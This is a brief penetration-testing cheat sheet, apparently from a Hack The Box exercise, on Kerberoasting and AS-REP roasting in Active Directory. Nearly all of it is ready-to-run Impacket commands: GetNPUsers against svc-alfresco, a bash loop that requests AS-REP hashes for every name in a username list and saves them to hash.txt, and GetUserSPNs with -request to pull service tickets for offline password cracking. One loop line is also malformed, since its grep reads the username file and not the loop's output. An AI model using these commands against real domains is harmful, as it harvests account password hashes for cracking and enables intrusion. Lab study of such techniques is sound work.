# Kerberoasting
## GetNPUsers (Impacket)
````bash
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
````

## Bruteforcing Kerberoasting
AS-REP roasting is a technique that allows retrieving password hashes for users that have Do not require Kerberos preauthentication property selected:

![](https://www.ired.team/~/files/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-L_nj7h01rJKzhElx_RC%2F-L_njEkL2a_oSCa1g0H9%2FScreenshot%20from%202019-03-12%2021-08-33.png?alt=media&token=dc08b9a5-1cae-4762-a6a0-773735227aad)

## Looping through a username list
**bash while read do**
````bash
while read p; do GetNPUsers.py <domain>/"$p" -request -no-pass -dc-ip <DC-IP> >> hash.txt; done < usernames.txt | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN' usernames.txt
````
**Impacket builtin loop**
````bash
GetNPUsers.py <domain>/ -no-pass -usersfile <username.txt> -dc-ip
<DC-IP> | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
````

## GetUserSPNs
Impacket’s GetUserSPNs.py again simplifies the process to find SPNs, and is also able to request the TGS and
extract the hash for offline cracking.
````bash
impacket-GetUserSPNs <domain>/<username> -dc-ip <DC-IP>
````
### Requesting TGS ticket
Requesting a Ticket Granting Service ticket, which is can be cracked offline because the TGS_REP is encrypted using NTLM password hash of the account in whose context the service instance is running.
````bash
impacket-GetUserSPNs <domain>/<username> -dc-ip <DC-IP> -request
````
